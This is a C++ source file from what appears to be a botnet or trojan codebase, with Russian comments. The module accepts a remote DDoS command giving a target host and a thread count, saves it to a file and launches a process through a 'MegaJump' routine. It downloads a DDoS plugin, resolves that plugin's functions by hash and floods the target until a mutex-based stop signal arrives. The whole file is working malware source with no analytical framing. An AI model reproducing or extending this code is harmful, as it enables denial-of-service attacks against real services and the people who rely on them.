#include "ddos.h"
#include "Plugins.h"
#include "Utils.h"
#include "StrConsts.h"
#include "BotCore.h"
#include "Inject.h"


//----------------------------------------------------------------------------
//  Функция процесса для работы DDOS
//----------------------------------------------------------------------------
DWORD WINAPI DDOSProces(LPVOID)
{
	#define Exit { return 0; pExitProcess(0); }

	BOT::Initialize();

	string FileName = BOT::MakeFileName(NULL, GetStr(EStrDDOSSignal).t_str());
	DWORD Sz = 0;
	PCHAR Args = (PCHAR)File::ReadToBufferA(FileName.t_str(), Sz);

	if (STRA::IsEmpty(Args)) Exit;

	// Получаем параметры команды

	PCHAR Host       = STR::GetLeftStr(Args, " ");
	if (STRA::IsEmpty(Host))
		Host = STR::New(Args);

	PCHAR StrThreads = STR::GetRightStr(Args, " ");

	int Count = StrToInt(StrThreads);

    MemFree(Args);

	// Загружаем плагин
	TPlugin Plugin(GetStr(EStrDDOSPlugin));

	if (!Plugin.Download(true)) Exit;




	// Запускаем DDOS атаку
	typedef int  (WINAPI *TStart)(char*, DWORD, DWORD, DWORD);
	typedef BOOL (WINAPI *TBusy)();
	typedef void (WINAPI *TStop)();


	TStart Start;
	TBusy  Busy;
	TStop  Stop;

	if (!Plugin.GetProcAddress(0x3E987971 /* Start */, (LPVOID&)Start) ||
		!Plugin.GetProcAddress(0x85D79F9 /* Busy */, (LPVOID&)Busy) ||
		!Plugin.GetProcAddress(0xA7D37F0 /* Stop */, (LPVOID&)Stop))
	{
		Exit;
	}


	string MutexName = GetStr(EStrDDOSSignal);

	// Стартуем
	if (Start(Host, Count, 0, 0) == 0)
	{
		// Переходим в режим ожидания команды стоп
		while (Busy())
		{
			HANDLE Handle = (HANDLE)pOpenMutexA(MUTEX_ALL_ACCESS, false, MutexName.t_str());
			if (Handle)
            {
				// Команда получена, плавно прекращаем работу
				Stop();
				DWORD St = (DWORD)pGetTickCount();
				while (Busy() && (DWORD)pGetTickCount() - St < 5000) pSleep(100);
				pCloseHandle(Handle);
				break;
			}

			pSleep(300);
		}
	}

    // Освобождаем данные
	STR::Free(Host);
	STR::Free(StrThreads);

	Exit;
}



//----------------------------------------------------------------------------
//  Команда запускает процесс DDOS атаки
//----------------------------------------------------------------------------
bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
{
	if (STRA::IsEmpty(Args)) return false;

	//Проверем на предмет необходимости остановки
	#define COMMAND_STOP 0xE7D37F0 /* stop */

	if (STRA::Hash(Args, 0, true) == COMMAND_STOP)
	{
		HANDLE Handle=(HANDLE)pCreateMutexA(NULL, false, GetStr(EStrDDOSSignal).t_str());
		pSleep(3000);
		pCloseHandle(Handle);
		return true;
	}

	// ------ Запускаем процесс --------

	// Сохраняем аргументы команды
	string FileName = BOT::MakeFileName(NULL, GetStr(EStrDDOSSignal).t_str());

	DWORD Len = STRA::Length(Args) + 1;
	if (File::WriteBufferA(FileName.t_str(), Args, Len) != Len)
		return false;


	// Запускаем процесс
	return MegaJump(DDOSProces) == TRUE;

//	return (StartThread(DDOSProces, NULL)) ? true : false;
}

